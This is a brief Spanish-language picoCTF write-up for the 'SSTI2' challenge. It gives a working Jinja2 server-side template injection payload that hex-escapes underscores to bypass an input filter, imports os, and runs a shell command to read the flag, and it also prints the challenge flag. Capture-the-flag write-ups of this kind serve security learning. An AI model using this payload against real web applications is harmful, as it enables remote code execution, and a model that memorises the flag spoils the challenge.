# SSTI2

Realizamos una inyección Server Side Template Injection# SSTI2

## Descripción

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:59252/)!
## Solución

```
#Realizamos una inyección parecida a la de un reto anterior

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

# picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}
```

picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}
## Notas adicionales

Realizamos una inyección Server Side Template Injection With Jinja2
## Referencias

https://onsecurity.io/article/server-side-template-injection-with-jinja2/